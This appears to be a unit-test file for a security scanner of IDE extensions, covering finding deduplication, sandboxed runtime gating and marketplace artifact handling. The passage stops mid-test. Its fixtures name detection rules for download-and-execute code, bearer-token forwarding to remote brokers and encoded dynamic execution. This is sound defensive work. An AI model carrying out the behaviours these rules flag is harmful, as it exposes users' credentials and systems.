from __future__ import annotations

import base64
import hmac
import hashlib
import json
import subprocess
import sys
import time
import unittest
import zipfile
from pathlib import Path
from tempfile import TemporaryDirectory
from unittest.mock import MagicMock, patch

from ide_scanner.benchmarks.adapters.protect_your_secrets import normalize_ground_truth_csv
from ide_scanner.benchmarks.runner import run_credential_exposure_benchmark, write_benchmark_bundle
from ide_scanner.discovery import discover_from_path
from ide_scanner.cli import _run_benchmark
from ide_scanner.posture import scan_posture, summarize_posture
from ide_scanner.registry import _marketplace_metadata_findings, _repository_metadata_findings
from ide_scanner.report_bundle import build_report_bundle, iter_report_events, write_report_bundle
from ide_scanner.sandbox_runner import (
    EXTERNAL_TRACE_ENV,
    RUNTIME_BWRAP_SUDO_ENV,
    RUNTIME_EVENT_HANDSHAKE,
    RUNTIME_EVENT_OUTPUT_LIMIT_MARKER,
    RUNTIME_EVENT_PREFIX,
    MAX_RUNTIME_OUTPUT_BYTES,
    _execute_entrypoint,
    _external_trace_observations,
    _extension_main,
    _observations_from_trace,
    _run_bounded_capture,
    _run_isolated,
    _prepare_target,
    _verified_runtime_events,
    _write_entrypoint_runner,
    run_sandbox,
    sandbox_preflight,
)
from ide_scanner.models import Finding
from ide_scanner.scanner import (
    _classify_findings,
    _build_report,
    _add_ast_findings,
    _apply_local_dynamic_runtime,
    _apply_security_decision,
    _apply_sandbox_provider,
    _aggregate_sandbox_observations,
    _dedupe_findings,
    _find_sensitive_api_text,
    _aliased_process_execution,
    _is_generated_code_blob,
    _load_known_bad_hashes,
    _load_threat_feed,
    _local_error_extension,
    _marketplace_error_extension,
    _score_details,
    _semgrep_scope_exclusion,
    _sandbox_observation_finding,
    _runtime_required_for_report,
    _runtime_execution_failure,
    _merge_dynamic_runtime_bundle,
    _runtime_unexpected_capability_finding,
    scan_extension,
    scan_marketplace_extension,
    scan_targets,
)
from ide_scanner.artifact_store import ArtifactStoreError, StoredArtifact


class ScannerTests(unittest.TestCase):
    def test_repeated_contextual_capability_notes_are_aggregated_with_paths(self) -> None:
        def finding(path: str) -> Finding:
            return Finding(
                finding_id=path,
                extension_id="publisher.tool",
                version="1.0.0",
                rule_id="filesystem-access",
                category="filesystem",
                severity="LOW",
                confidence=0.42,
                score=20,
                evidence_type="static",
                evidence_summary="Extension reads or writes local files. Expected for many developer tools.",
                file_refs=[path],
                recommendation="Treat this as review evidence unless it combines with credential, network, download, or destructive behavior.",
                evidence={"evidence_class": "weak"},
            )

        result = _dedupe_findings([finding("dist/a.js"), finding("dist/b.js")])

        self.assertEqual(len(result), 1)
        self.assertEqual(result[0].file_refs, ["dist/a.js", "dist/b.js"])
        self.assertEqual(result[0].evidence["occurrence_count"], 2)
        self.assertEqual(result[0].evidence["occurrence_files"], ["dist/a.js", "dist/b.js"])

    def test_repeated_weak_ast_dispatch_notes_are_aggregated_without_losing_paths(self) -> None:
        def finding(path: str) -> Finding:
            return Finding(
                finding_id=path,
                extension_id="publisher.tool",
                version="1.0.0",
                rule_id="ast-dynamic-call-target",
                category="execution",
                severity="MEDIUM",
                confidence=0.65,
                score=45,
                evidence_type="static",
                evidence_summary=f"AST found computed call target in {path}.",
                file_refs=[path],
                recommendation="Treat computed dispatch as contextual only.",
                evidence={"evidence_class": "weak", "count": 3 if path.endswith("a.js") else 2},
            )

        result = _dedupe_findings([finding("dist/a.js"), finding("dist/b.js")])

        self.assertEqual(len(result), 1)
        self.assertEqual(result[0].file_refs, ["dist/a.js", "dist/b.js"])
        self.assertEqual(result[0].evidence["occurrence_count"], 2)
        self.assertEqual(result[0].evidence["occurrence_files"], ["dist/a.js", "dist/b.js"])
        self.assertEqual(result[0].evidence["target_count"], 5)
        self.assertIn("5 computed call target(s) in 2 file(s)", result[0].evidence_summary)

    def test_correlated_findings_are_not_aggregated_as_contextual_notes(self) -> None:
        def finding(path: str) -> Finding:
            return Finding(
                finding_id=path,
                extension_id="publisher.tool",
                version="1.0.0",
                rule_id="download-and-execute",
                category="execution",
                severity="HIGH",
                confidence=0.82,
                score=78,
                evidence_type="static",
                evidence_summary="Code can download content and execute local processes from the same file.",
                file_refs=[path],
                recommendation="Verify the download source, integrity checks, and execution purpose.",
                evidence={"evidence_class": "correlated"},
            )

        result = _dedupe_findings([finding("src/a.js"), finding("src/b.js")])

        self.assertEqual(len(result), 2)
        self.assertNotIn("occurrence_count", result[0].evidence or {})

    def test_repeated_remote_broker_review_evidence_is_aggregated_with_paths(self) -> None:
        findings = [
            Finding(
                finding_id=path,
                extension_id="publisher.tool",
                version="1.0.0",
                rule_id="remote-credential-broker",
                category="cross-extension-exposure",
                severity="HIGH",
                confidence=0.84,
                score=78,
                evidence_type="static",
                evidence_summary="Code appears to obtain or forward bearer tokens through a separately configured remote token broker.",
                file_refs=[path],
                recommendation="Verify endpoint ownership, token scope, retention, and user disclosure.",
                evidence={
                    "evidence_class": "exposure",
                    "correlation": "same-file-semantic-chain",
                },
            )
            for path in ("dist/provider-a.js", "dist/provider-b.js")
        ]

        result = _dedupe_findings(findings)

        self.assertEqual(len(result), 1)
        self.assertEqual(result[0].file_refs, ["dist/provider-a.js", "dist/provider-b.js"])
        self.assertEqual(result[0].evidence["occurrence_count"], 2)
        self.assertEqual(result[0].evidence["occurrence_files"], result[0].file_refs)
        self.assertEqual(result[0].evidence["correlation"], "same-file-semantic-chain")

    def test_repeated_contextual_shell_capability_is_aggregated(self) -> None:
        findings = [
            Finding(
                finding_id=path,
                extension_id="publisher.tool",
                version="1.0.0",
                rule_id="dynamic-shell-execution",
                category="execution",
                severity="MEDIUM",
                confidence=0.72,
                score=45,
                evidence_type="static",
                evidence_summary="Code uses shell-style process execution.",
                file_refs=[path],
                recommendation="Review command construction and avoid shell execution for untrusted input.",
                evidence={"evidence_class": "capability"},
            )
            for path in ("dist/a.js", "dist/b.js")
        ]

        result = _dedupe_findings(findings)

        self.assertEqual(len(result), 1)
        self.assertEqual(result[0].evidence["occurrence_count"], 2)

    def test_repeated_weak_encoded_execution_matches_are_aggregated_as_context(self) -> None:
        findings = [
            Finding(
                finding_id=path,
                extension_id="publisher.tool",
                version="1.0.0",
                rule_id="encoded-dynamic-execution",
                category="code",
                severity="HIGH",
                confidence=0.68,
                score=40,
                evidence_type="static-provider",
                evidence_summary="YARA rule ide_scanner_encoded_dynamic_execution matched encoded dynamic-execution markers in executable code.",
                file_refs=[path],
                recommendation="Use this as supporting context.",
                evidence={"provider": "yara", "evidence_class": "weak"},
            )
            for path in ("dist/a.js", "node_modules/pkg/b.js")
        ]

        result = _dedupe_findings(findings)

        self.assertEqual(len(result), 1)
        self.assertEqual(result[0].evidence["occurrence_count"], 2)
        self.assertEqual(result[0].evidence["occurrence_files"], ["dist/a.js", "node_modules/pkg/b.js"])

    def test_repeated_weak_secret_reference_notes_are_aggregated_with_paths(self) -> None:
        findings = [
            Finding(
                finding_id=path,
                extension_id="publisher.tool",
                version="1.0.0",
                rule_id="secret-reference:env-file",
                category="credential",
                severity="LOW",
                confidence=0.5,
                score=20,
                evidence_type="static",
                evidence_summary="Code references environment files.",
                file_refs=[path],
                recommendation="Treat this as contextual unless a credential value reaches a sensitive sink.",
                evidence={"evidence_class": "weak", "secret_id": "env-file"},
            )
            for path in ("dist/a.js", "dist/b.js")
        ]

        result = _dedupe_findings(findings)

        self.assertEqual(len(result), 1)
        self.assertEqual(result[0].file_refs, ["dist/a.js", "dist/b.js"])
        self.assertEqual(result[0].evidence["occurrence_count"], 2)
        self.assertEqual(result[0].evidence["occurrence_files"], ["dist/a.js", "dist/b.js"])

    def test_local_runtime_is_capability_gated_and_attached_to_exact_report(self) -> None:
        with TemporaryDirectory() as tmp:
            artifact = Path(tmp) / "agent.vsix"
            artifact.write_bytes(b"exact")
            report = MagicMock()
            report.extension_id = "publisher.agent"
            report.version = "1.0.0"
            report.artifact_hash = "a" * 64
            report.capabilities = [{"id": "agentic", "evidence": ["package.json"]}]
            runtime_bundle: dict[str, object] = {"extensions": {}, "runs": [], "required_extension_ids": []}
            runtime = {"mode": "executed", "extensions": {"publisher.agent": [{"kind": "process_exec"}]}}
            with patch("ide_scanner.scanner.run_sandbox", return_value=runtime) as sandbox:
                _apply_local_dynamic_runtime(
                    [{"path": str(artifact)}], [report], runtime_bundle, timeout_seconds=7,
                )

            sandbox.assert_called_once_with(artifact, allow_execute=True, timeout_seconds=7)
            self.assertEqual(runtime_bundle["required_extension_ids"], ["publisher.agent"])
            self.assertEqual(runtime_bundle["extensions"]["publisher.agent"][0]["kind"], "process_exec")
            self.assertEqual(runtime_bundle["runs"][0]["status"], "completed")

    def test_runtime_trace_metadata_requires_valid_external_trace(self) -> None:
        with TemporaryDirectory() as tmp:
            artifact = Path(tmp) / "agent.vsix"
            artifact.write_bytes(b"exact")
            report = MagicMock()
            report.extension_id = "publisher.agent"
            report.version = "1.0.0"
            report.artifact_hash = "a" * 64
            report.capabilities = [{"id": "agentic", "evidence": ["package.json"]}]
            runtime = {
                "mode": "executed",
                "plan": {"instrumentation": {"external_syscall_trace": {"requested": True, "available": True}}},
                "extensions": {"publisher.agent": [{"kind": "entrypoint_executed"}]},
            }
            runtime_bundle: dict[str, object] = {"extensions": {}, "runs": [], "required_extension_ids": []}
            with patch("ide_scanner.scanner.run_sandbox", return_value=runtime):
                _apply_local_dynamic_runtime(
                    [{"path": str(artifact)}], [report], runtime_bundle, timeout_seconds=7,
                )

            self.assertTrue(runtime_bundle["external_syscall_trace"])
            self.assertTrue(runtime_bundle["external_syscall_trace_available"])
            self.assertTrue(runtime_bundle["runs"][0]["external_syscall_trace"])

            failed_bundle: dict[str, object] = {"extensions": {}, "runs": [], "required_extension_ids": []}
            failed_runtime = {
                **runtime,
                "extensions": {"publisher.agent": [{"kind": "sandbox_error"}]},
            }
            with patch("ide_scanner.scanner.run_sandbox", return_value=failed_runtime):
                _apply_local_dynamic_runtime(
                    [{"path": str(artifact)}], [report], failed_bundle, timeout_seconds=7,
                )

            self.assertFalse(failed_bundle["external_syscall_trace"])
            self.assertFalse(failed_bundle["runs"][0]["external_syscall_trace"])

    def test_failed_entrypoint_receipt_cannot_be_marked_runtime_complete(self) -> None:
        with TemporaryDirectory() as tmp:
            artifact = Path(tmp) / "agent.vsix"
            artifact.write_bytes(b"exact")
            report = MagicMock()
            report.extension_id = "publisher.agent"
            report.version = "1.0.0"
            report.artifact_hash = "a" * 64
            report.capabilities = [{"id": "agentic", "evidence": ["package.json"]}]
            runtime = {
                "mode": "executed",
                "plan": {
                    "instrumentation": {
                        "external_syscall_trace": {"requested": True, "available": True},
                    },
                },
                "extensions": {
                    "publisher.agent": [{"kind": "runtime_entrypoint_error", "returncode": 1}],
                },
            }
            runtime_bundle: dict[str, object] = {"extensions": {}, "runs": [], "required_extension_ids": []}
            with patch("ide_scanner.scanner.run_sandbox", return_value=runtime):
                _apply_local_dynamic_runtime(
                    [{"path": str(artifact)}], [report], runtime_bundle, timeout_seconds=7,
                )

        self.assertEqual(runtime_bundle["runs"][0]["status"], "failed")
        self.assertFalse(runtime_bundle["runs"][0]["external_syscall_trace"])
        self.assertFalse(runtime_bundle["external_syscall_trace"])

    def test_required_runtime_failure_cannot_be_allowed_after_static_completion(self) -> None:
        with TemporaryDirectory() as tmp:
            root = Path(tmp)
            (root / "package.json").write_text(
                json.dumps({
                    "publisher": "example",
                    "name": "runtime-required",
                    "version": "1.0.0",
                    "main": "./extension.js",
                }),
                encoding="utf-8",
            )
            (root / "extension.js").write_text("exports.activate = () => {};\n", encoding="utf-8")
            extension = scan_extension(root)
            runtime_bundle: dict[str, object] = {
                "schema_version": "0.1.0",
                "mode": "executed",
                "extensions": {},
                "runs": [],
                "required_extension_ids": [],
                "external_syscall_trace": False,
                "external_syscall_trace_available": False,
            }
            with patch(
                "ide_scanner.scanner.run_sandbox",
                side_effect=ValueError("sandbox preflight unavailable"),
            ):
                _apply_local_dynamic_runtime(
                    [{"path": str(root)}], [extension], runtime_bundle, timeout_seconds=1,
                )
            merged = _merge_dynamic_runtime_bundle(
                {"extensions": {}, "metadata": {}}, runtime_bundle,
            )
            _apply_sandbox_provider([extension], merged)
            _apply_security_decision(extension)

        self.assertEqual(extension.analysis_status, "incomplete")
        self.assertEqual(extension.analysis_coverage["status"], "incomplete")
        self.assertFalse(extension.analysis_coverage["required_providers_complete"])
        self.assertEqual(extension.decision, "incomplete")
        self.assertIn("Required provider dynamic_sandbox did not complete", extension.analysis_coverage["limitations"])

    def test_local_runtime_does_not_execute_theme_capability_only_artifact(self) -> None:
        with TemporaryDirectory() as tmp:
            artifact = Path(tmp) / "theme.vsix"
            artifact.write_bytes(b"exact")
            report = MagicMock()
            report.extension_id = "publisher.theme"
            report.version = "1.0.0"
            report.artifact_hash = "b" * 64
            report.capabilities = [{"id": "filesystem", "evidence": ["dist/theme.js"]}]
            runtime_bundle: dict[str, object] = {"extensions": {}, "runs": [], "required_extension_ids": []}
            with patch("ide_scanner.scanner.run_sandbox") as sandbox:
                _apply_local_dynamic_runtime(
                    [{"path": str(artifact)}], [report], runtime_bundle, timeout_seconds=7,
                )

            sandbox.assert_not_called()
            self.assertEqual(runtime_bundle["required_extension_ids"], [])
            self.assertEqual(runtime_bundle["runs"][0]["status"], "not-applicable")

    def test_theme_with_an_entrypoint_receives_runtime_coverage(self) -> None:
        with TemporaryDirectory() as tmp:
            root = Path(tmp)
            (root / "package.json").write_text(
                json.dumps({
                    "publisher": "publisher",
                    "name": "pretty-theme",
                    "version": "1.0.0",
                    "description": "A color theme with an activation entrypoint",
                    "main": "./extension.js",
                    "activationEvents": ["onStartupFinished"],
                }),
                encoding="utf-8",
            )
            (root / "extension.js").write_text("module.exports = { activate() {} };", encoding="utf-8")
            report = scan_extension(root)

        self.assertTrue(_runtime_required_for_report(report))

    def test_manifest_theme_surface_classifies_icon_extension(self) -> None:
        with TemporaryDirectory() as tmp:
            root = Path(tmp)
            (root / "package.json").write_text(
                json.dumps({
                    "publisher": "publisher",
                    "name": "icon-pack",
                    "version": "1.0.0",
                    "description": "Icons for Visual Studio Code",
                    "main": "./extension.js",
                    "contributes": {"iconThemes": [{"id": "icon-pack", "path": "./icons.json"}]},
                }),
                encoding="utf-8",
            )
            (root / "extension.js").write_text("module.exports = { activate() {} };", encoding="utf-8")
            report = scan_extension(root)

        capability_ids = {item["id"] for item in report.capabilities}
        self.assertIn("theme_surface", capability_ids)
        self.assertTrue(_runtime_required_for_report(report))

    def test_theme_process_capability_enters_review(self) -> None:
        with TemporaryDirectory() as tmp:
            root = Path(tmp)
            (root / "package.json").write_text(
                json.dumps({
                    "publisher": "publisher",
                    "name": "pretty-theme",
                    "version": "1.0.0",
                    "description": "A color theme",
                    "main": "./extension.js",
                }),
                encoding="utf-8",
            )
            (root / "extension.js").write_text(
                "require('child_process').spawn('sh', ['-c', 'echo theme']);",
                encoding="utf-8",
            )
            report = scan_extension(root)
            _apply_security_decision(report)

        self.assertIn("process_execution", {item["id"] for item in report.capabilities})
        self.assertEqual(report.decision, "review")

    def test_documentation_service_worker_does_not_grant_runtime_network_capability(self) -> None:
        with TemporaryDirectory() as tmp:
            root = Path(tmp)
            (root / "package.json").write_text(
                json.dumps({
                    "publisher": "publisher",
                    "name": "documentation-theme",
                    "version": "1.0.0",
                    "description": "A color theme",
                    "main": "./extension.js",
                }),
                encoding="utf-8",
            )
            (root / "extension.js").write_text("module.exports = { activate() {} };", encoding="utf-8")
            (root / "docs").mkdir()
            (root / "docs" / "sw.js").write_text("fetch('https://docs.example.test/update');", encoding="utf-8")

            report = scan_extension(root)
            _apply_security_decision(report)

        self.assertEqual(report.decision, "allow")
        self.assertNotIn("network", {item["id"] for item in report.capabilities})
        self.assertNotIn("docs/sw.js", report.analysis_coverage["analyzed_executable_files"])

    def test_runtime_process_not_declared_is_review_evidence(self) -> None:
        with TemporaryDirectory() as tmp:
            root = Path(tmp)
            (root / "package.json").write_text(
                '{"publisher":"publisher","name":"runtime-theme","version":"1.0.0"}',
                encoding="utf-8",
            )
            report = scan_extension(root)
            finding = _runtime_unexpected_capability_finding(
                report,
                {"kind": "process_exec", "command": "hidden-tool", "observation_count": 2},
            )

        self.assertIsNotNone(finding)
        assert finding is not None
        self.assertEqual(finding.rule_id, "observed-unexpected-capability")
        self.assertEqual(finding.evidence_type, "dynamic")
        self.assertEqual(finding.to_dict()["actionability"], "review")

    def test_local_runtime_requires_native_code_coverage(self) -> None:
        with TemporaryDirectory() as tmp:
            artifact = Path(tmp) / "native.vsix"
            artifact.write_bytes(b"exact")
            report = MagicMock()
            report.extension_id = "publisher.native"
            report.version = "1.0.0"
            report.artifact_hash = "c" * 64
            report.capabilities = [{"id": "native_code", "evidence": ["server.node"]}]
            runtime_bundle: dict[str, object] = {"extensions": {}, "runs": [], "required_extension_ids": []}
            with patch("ide_scanner.scanner.run_sandbox") as sandbox:
                _apply_local_dynamic_runtime(
                    [{"path": str(artifact)}], [report], runtime_bundle, timeout_seconds=7,
                )

            sandbox.assert_called_once_with(artifact, allow_execute=True, timeout_seconds=7)
            self.assertEqual(runtime_bundle["required_extension_ids"], ["publisher.native"])
            self.assertEqual(runtime_bundle["runs"][0]["status"], "completed")

    def test_required_runtime_without_execution_path_is_incomplete(self) -> None:
        with TemporaryDirectory() as tmp:
            artifact = Path(tmp) / "native-without-entrypoint.vsix"
            artifact.write_bytes(b"exact")
            report = MagicMock()
            report.extension_id = "publisher.native"
            report.version = "1.0.0"
            report.artifact_hash = "d" * 64
            report.capabilities = [{"id": "native_code", "evidence": ["server.node"]}]
            runtime = {
                "mode": "executed",
                "plan": {"instrumentation": {"entrypoint_status": "not-applicable"}},
                "extensions": {"publisher.native": []},
            }
            runtime_bundle: dict[str, object] = {"extensions": {}, "runs": [], "required_extension_ids": []}
            with patch("ide_scanner.scanner.run_sandbox", return_value=runtime):
                _apply_local_dynamic_runtime(
                    [{"path": str(artifact)}], [report], runtime_bundle, timeout_seconds=7,
                )

            self.assertEqual(runtime_bundle["runs"][0]["status"], "failed")
            self.assertIn("no declared Node activation entrypoint", runtime_bundle["runs"][0]["error"])
            self.assertEqual(runtime_bundle["extensions"]["publisher.native"][0]["kind"], "sandbox_error")

    def test_required_runtime_sidecar_failure_is_incomplete(self) -> None:
        with TemporaryDirectory() as tmp:
            artifact = Path(tmp) / "rust-without-sidecar.vsix"
            artifact.write_bytes(b"exact")
            report = MagicMock()
            report.extension_id = "publisher.rust"
            report.version = "1.0.0"
            report.artifact_hash = "e" * 64
            report.capabilities = [{"id": "native_code", "evidence": ["server/rust-analyzer"]}]
            runtime = {
                "mode": "executed",
                "plan": {
                    "instrumentation": {"entrypoint_status": "declared"},
                    "runtime_dependencies": [{
                        "dependency": "rust-analyzer",
                        "required": True,
                        "status": "missing-cache",
                    }],
                },
                "extensions": {"publisher.rust": [{"kind": "entrypoint_executed"}]},
            }
            runtime_bundle: dict[str, object] = {"extensions": {}, "runs": [], "required_extension_ids": []}
            with patch("ide_scanner.scanner.run_sandbox", return_value=runtime):
                _apply_local_dynamic_runtime(
                    [{"path": str(artifact)}], [report], runtime_bundle, timeout_seconds=7,
                )

            self.assertEqual(runtime_bundle["runs"][0]["status"], "failed")
            self.assertIn("rust-analyzer", runtime_bundle["runs"][0]["error"])
            self.assertIn("missing-cache", runtime_bundle["runs"][0]["error"])

    def test_ast_dynamic_call_targets_are_aggregated_per_file(self) -> None:
        findings: list[Finding] = []
        with patch(
            "ide_scanner.scanner.analyze_js_source_status",
            return_value=(
                [
                    {"rule": "ast-dynamic-call-target", "line": 10, "detail": "first"},
                    {"rule": "ast-dynamic-call-target", "line": 20, "detail": "second"},
                ],
                "ok",
            ),
        ):
            status = _add_ast_findings("example.ext", "1.0.0", "dist/main.js", "x", findings)
        self.assertEqual(status, "ok")
        self.assertEqual(len(findings), 1)
        self.assertEqual(findings[0].rule_id, "ast-dynamic-call-target")
        self.assertEqual(findings[0].evidence["count"], 2)
        self.assertEqual(findings[0].evidence["evidence_class"], "weak")
        self.assertIn("2 computed call target(s)", findings[0].evidence_summary)

    def test_incomplete_artifact_is_not_counted_as_clean(self) -> None:
        extension = _local_error_extension(Path("/tmp/timed-out-extension"), "vscode", "worker timeout")
        report = _build_report(
            [extension],
            {"enabled": False, "mode": "disabled", "findings": [], "errors": []},
            include_posture=False,
        )
        self.assertEqual(report["summary"]["by_verdict"], {})
        self.assertEqual(report["summary"]["by_analysis_status"], {"failed": 1})
        self.assertIn("0 clean, 1 incomplete", report["human_summary"][0])

    def test_oversized_artifact_is_quarantined_before_expensive_analysis(self) -> None:
        with TemporaryDirectory() as tmp:
            root = Path(tmp)
            (root / "package.json").write_text(
                '{"publisher":"example","name":"oversized","version":"1.0.0"}',
                encoding="utf-8",
            )
            (root / "extension.js").write_text("module.exports = {};", encoding="utf-8")
            with patch("ide_scanner.scanner.MAX_EXTENSION_BYTES", 1):
                report = scan_targets(paths=[root], include_posture=False)

        extension = report["extensions"][0]
        self.assertEqual(extension["analysis_status"], "failed")
        self.assertEqual(extension["decision"], "incomplete")
        self.assertIn("exceeds scan resource budget", extension["decision_reason"])
        self.assertEqual(extension["scanned_files"], 0)

    def test_isolated_local_failure_preserves_manifest_identity(self) -> None:
        with TemporaryDirectory() as tmp:
            root = Path(tmp)
            (root / "package.json").write_text(
                '{"publisher":"example","name":"timed-out","version":"2.3.4"}',
                encoding="utf-8",
            )

            extension = _local_error_extension(root, "vscode", "worker timeout")

        self.assertEqual(extension.extension_id, "example.timed-out")
        self.assertEqual(extension.publisher, "example")
        self.assertEqual(extension.version, "2.3.4")
        self.assertEqual(extension.analysis_status, "incomplete")
        self.assertEqual(extension.decision, "incomplete")

    def test_parallel_local_scan_preserves_serial_results(self) -> None:
        serial = scan_targets(include_fixtures=True, include_posture=False, jobs=1)
        parallel = scan_targets(include_fixtures=True, include_posture=False, jobs=2)
        serial_rows = [(item["extension_id"], item["decision"], item["risk_score"]) for item in serial["extensions"]]
        parallel_rows = [(item["extension_id"], item["decision"], item["risk_score"]) for item in parallel["extensions"]]
        self.assertEqual(parallel_rows, serial_rows)

    def test_marketplace_scan_preserves_before_analysis_and_reports_storage(self) -> None:
        with TemporaryDirectory() as tmp:
            downloaded = Path(tmp) / "download.vsix"
            downloaded.write_bytes(b"PK\x03\x04exact")
            preserved = Path(tmp) / "vault" / "object.vsix"
            preserved.parent.mkdir()
            preserved.write_bytes(downloaded.read_bytes())
            digest = hashlib.sha256(preserved.read_bytes()).hexdigest()
            store = MagicMock()
            store.preserve.return_value = StoredArtifact(
                preserved, "filesystem", f"sha256/{digest[:2]}/{digest}.vsix", digest,
                preserved.stat().st_size, "publisher.extension", "1.2.3", "vs-marketplace",
                "linux-x64", "2026-01-01T00:00:00Z", "2026-01-01T00:00:00Z",
            )
            report = MagicMock()
            report.extension_id = "publisher.extension"
            report.version = "1.2.3"
            report.artifact_hash = digest
            report.artifact_identity = {"sha256": digest}
            report.artifact_inventory = {}
            metadata = {
                "extension_id": "publisher.extension", "version": "1.2.3",
                "registry": "vs-marketplace", "target_platform": "linux-x64",
                "expected_sha256": digest, "sha256_verified": "true",
                "signature_asset_declared": "true",
                "integrity_metadata_matches_artifact": "true",
            }

            def download(*_args, registry_out, **_kwargs):
                registry_out.update(metadata)
                return downloaded

            with patch("ide_scanner.scanner.download_marketplace_vsix", side_effect=download), patch(
                "ide_scanner.scanner.scan_vsix", return_value=report
            ) as scan:
                result = scan_marketplace_extension(
                    "publisher.extension", version="1.2.3", target_platform="linux-x64",
                    artifact_store=store,
                )

            store.preserve.assert_called_once()
            scan.assert_called_once_with(preserved, known_bad_hashes=None, artifact_origin="archive_artifact")
            self.assertFalse(downloaded.exists())
            self.assertTrue(preserved.exists())
            self.assertEqual(result.artifact_identity["target_platform"], "linux-x64")
            self.assertEqual(result.artifact_identity["storage"]["sha256"], digest)
            self.assertEqual(result.artifact_inventory["artifact_storage"]["storage_key"], store.preserve.return_value.storage_key)
            self.assertTrue(result.artifact_identity["signature"]["present"])
            self.assertFalse(result.artifact_identity["signature"]["verified"])
            self.assertTrue(result.artifact_identity["signature"]["package_integrity"]["matched"])
            self.assertNotIn(str(Path(tmp) / "vault"), json.dumps(result.artifact_identity))

    def test_marketplace_preservation_failure_is_incomplete_and_deletes_download(self) -> None:
        with TemporaryDirectory() as tmp:
            downloaded = Path(tmp) / "download.vsix"
            downloaded.write_bytes(b"PK\x03\x04exact")
            store = MagicMock()
            store.preserve.side_effect = ArtifactStoreError("vault unavailable")
            with patch("ide_scanner.scanner.download_marketplace_vsix", return_value=downloaded), patch(
                "ide_scanner.scanner.scan_vsix"
            ) as scan:
                result = scan_marketplace_extension("publisher.extension", version="1.2.3", artifact_store=store)

            scan.assert_not_called()
            self.assertFalse(downloaded.exists())
            self.assertEqual(result.source, "marketplace-error")
            self.assertTrue(result.artifact_inventory["scan_incomplete"])
            self.assertIn("could not be preserved", result.artifact_inventory["skipped_reason"])

    def test_marketplace_runtime_is_capability_gated_and_attached_to_exact_report(self) -> None:
        with TemporaryDirectory() as tmp:
            downloaded = Path(tmp) / "download.vsix"
            downloaded.write_bytes(b"PK\x03\x04exact")
            digest = hashlib.sha256(downloaded.read_bytes()).hexdigest()
            report = MagicMock()
            report.extension_id = "publisher.extension"
            report.version = "1.2.3"
            report.artifact_hash = digest
            report.capabilities = [{"id": "agentic", "evidence": ["package.json"]}]
            report.artifact_identity = {"sha256": digest}
            report.artifact_inventory = {}
            metadata = {
                "extension_id": "publisher.extension", "version": "1.2.3",
                "registry": "vs-marketplace", "target_platform": "",
                "expected_sha256": digest, "sha256_verified": "true",
                "signature_asset_declared": "false",
                "integrity_metadata_matches_artifact": "true",
            }
            runtime_bundle: dict[str, object] = {
                "extensions": {}, "runs": [], "required_extension_ids": [],
            }

            def download(*_args, registry_out, **_kwargs):
                registry_out.update(metadata)
                return downloaded

            runtime = {"mode": "executed", "extensions": {"publisher.extension": [{"kind": "process_exec"}]}}
            with patch("ide_scanner.scanner.download_marketplace_vsix", side_effect=download), patch(
                "ide_scanner.scanner.scan_vsix", return_value=report
            ), patch("ide_scanner.scanner.run_sandbox", return_value=runtime) as sandbox:
                result = scan_marketplace_extension(
                    "publisher.extension", version="1.2.3", dynamic_runtime=True,
                    runtime_timeout_seconds=7, runtime_bundle=runtime_bundle,
                )

            sandbox.assert_called_once_with(downloaded, allow_execute=True, timeout_seconds=7)
            self.assertEqual(result.extension_id, "publisher.extension")
            self.assertEqual(runtime_bundle["required_extension_ids"], ["publisher.extension"])
            self.assertEqual(runtime_bundle["extensions"]["publisher.extension"][0]["kind"], "process_exec")

    def test_marketplace_runtime_skips_non_executable_package(self) -> None:
        with TemporaryDirectory() as tmp:
            downloaded = Path(tmp) / "theme.vsix"
            downloaded.write_bytes(b"PK\x03\x04theme")
            digest = hashlib.sha256(downloaded.read_bytes()).hexdigest()
            report = MagicMock()
            report.extension_id = "publisher.theme"
            report.version = "1.0.0"
            report.artifact_hash = digest
            report.capabilities = [{"id": "themes", "evidence": ["package.json"]}]
            report.artifact_identity = {"sha256": digest}
            report.artifact_inventory = {}
            metadata = {
                "extension_id": "publisher.theme", "version": "1.0.0", "registry": "vs-marketplace",
                "target_platform": "", "expected_sha256": digest, "sha256_verified": "true",
                "signature_asset_declared": "false", "integrity_metadata_matches_artifact": "true",
            }
            runtime_bundle: dict[str, object] = {"extensions": {}, "runs": [], "required_extension_ids": []}

            def download(*_args, registry_out, **_kwargs):
                registry_out.update(metadata)
                return downloaded

            with patch("ide_scanner.scanner.download_marketplace_vsix", side_effect=download), patch(
                "ide_scanner.scanner.scan_vsix", return_value=report
            ), patch("ide_scanner.scanner.run_sandbox") as sandbox:
                scan_marketplace_extension(
                    "publisher.theme", version="1.0.0", dynamic_runtime=True, runtime_bundle=runtime_bundle,
                )

            sandbox.assert_not_called()
            self.assertEqual(runtime_bundle["runs"][0]["status"], "not-applicable")

    def test_executed_runtime_provider_counts_as_completed_coverage(self) -> None:
        extension = MagicMock()
        extension.extension_id = "publisher.extension"
        extension.instance_id = "publisher.extension@1.0.0"
        extension.analysis_coverage = {"providers": {}}
        _apply_sandbox_provider(
            [extension],
            {
                "metadata": {
                    "status": "executed",
                    "mode": "executed",
                    "execution": "controlled-bubblewrap",
                    "executed": True,
                    "external_syscall_trace": True,
                    "runtime_policy": "capability-gated-v1",
                    "runtime_required_instances": ["publisher.extension@1.0.0"],
                    "runtime_runs": [{
                        "instance_id": "publisher.extension@1.0.0",
                        "extension_id": "publisher.extension",
                        "status": "completed",
                        "external_syscall_trace": True,
                    }],
                },
                "extensions": {"publisher.extension": []},
            },
        )
        provider = extension.analysis_coverage["providers"]["dynamic_sandbox"]
        self.assertEqual(provider["status"], "completed")
        self.assertTrue(provider["executed"])
        self.assertTrue(provider["external_syscall_trace"])
        self.assertEqual(provider["runtime_run_status"], "completed")

    def test_required_runtime_provider_fails_when_exact_run_receipt_is_missing(self) -> None:
        extension = MagicMock()
        extension.extension_id = "publisher.extension"
        extension.instance_id = "publisher.extension@1.0.0"
        extension.analysis_coverage = {"providers": {}}
        _apply_sandbox_provider(
            [extension],
            {
                "metadata": {
                    "status": "executed",
                    "mode": "executed",
                    "execution": "controlled-bubblewrap",
                    "executed": True,
                    "external_syscall_trace": True,
                    "external_syscall_trace_available": True,
                    "runtime_policy": "capability-gated-v1",
                    "runtime_required_instances": ["publisher.extension@1.0.0"],
                    "runtime_runs": [],
                },
                "extensions": {"publisher.extension@1.0.0": []},
            },
        )
        provider = extension.analysis_coverage["providers"]["dynamic_sandbox"]
        self.assertEqual(provider["status"], "failed")
        self.assertEqual(provider["runtime_run_status"], "missing")
        self.assertFalse(provider["external_syscall_trace"])

    def test_required_runtime_provider_fails_when_run_receipt_is_not_complete(self) -> None:
        extension = MagicMock()
